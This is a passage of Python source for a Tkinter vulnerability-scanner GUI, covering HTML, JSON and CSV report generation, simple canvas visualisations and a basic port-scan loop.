    <div class="report-content">
        <h2>Detailed Findings</h2>
        <pre>{html.escape(content)}</pre>
    </div>
</body>
</html>""")

    def generate_json_report(self, filename: str, content: str):
        """Generate JSON report"""
        findings = []
        for line in content.split('\n'):
            if not line.strip():
                continue
                
            severity = 'info'
            if '[CRITICAL]' in line:
                severity = 'critical'
            elif '[HIGH]' in line:
                severity = 'high'
            elif '[MEDIUM]' in line:
                severity = 'medium'
            elif '[LOW]' in line:
                severity = 'low'
                
            findings.append({
                'severity': severity,
                'message': line
            })
        
        report = {
            "metadata": {
                "target": self.target_entry.get(),
                "timestamp": datetime.now().isoformat(),
                "vulnerabilities": self.vulnerabilities_found,
                "scan_duration": self.get_scan_duration()
            },
            "findings": findings
        }
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2)

    def generate_csv_report(self, filename: str, content: str):
        """Generate CSV report"""
        with open(filename, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(["Severity", "Message", "Timestamp"])
            
            for line in content.split('\n'):
                if not line.strip():
                    continue
                    
                severity = 'INFO'
                if '[CRITICAL]' in line:
                    severity = 'CRITICAL'
                elif '[HIGH]' in line:
                    severity = 'HIGH'
                elif '[MEDIUM]' in line:
                    severity = 'MEDIUM'
                elif '[LOW]' in line:
                    severity = 'LOW'
                    
                writer.writerow([severity, line, datetime.now().isoformat()])

    def get_scan_duration(self) -> str:
        """Calculate and return scan duration (placeholder implementation)"""
        return "Not tracked in this version"

    def update_visualizations(self):
        """Update visualization tab with scan results"""
        self.summary_canvas.delete("all")
        self.timeline_canvas.delete("all")
        
        # Simple summary visualization with updated styling
        self.summary_canvas.create_text(150, 30, 
                                        text="Vulnerability Summary", 
                                        fill=ACCENT_COLOR, 
                                        font=SUBHEADER_FONT)
        self.summary_canvas.create_text(150, 70, 
                                        text=f"Total Vulnerabilities Found: {self.vulnerabilities_found}", 
                                        fill=FG_COLOR, 
                                        font=BODY_FONT)
        
        # Simple timeline visualization with updated styling
        self.timeline_canvas.create_text(150, 30, 
                                         text="Scan Timeline", 
                                         fill=ACCENT_COLOR, 
                                         font=SUBHEADER_FONT)
        self.timeline_canvas.create_text(150, 70, 
                                         text="Scan phases would be visualized here", 
                                         fill=FG_COLOR, 
                                         font=BODY_FONT)

    def scan_ports(self, host: str, port_range: str) -> List[int]:
        """Scan ports and return list of open ports"""
        open_ports = []
        ports = self.parse_port_range(port_range)
        
        for port in ports:
            if self.scan_port(host, port):
                open_ports.append(port)
                
        return open_ports

if __name__ == "__main__":
    root = tk.Tk()
    try:
        app = AdvancedWebScanner(root)
        root.mainloop()
    except Exception as e:
        print(f"Application error: {e}", file=sys.stderr)
        raise
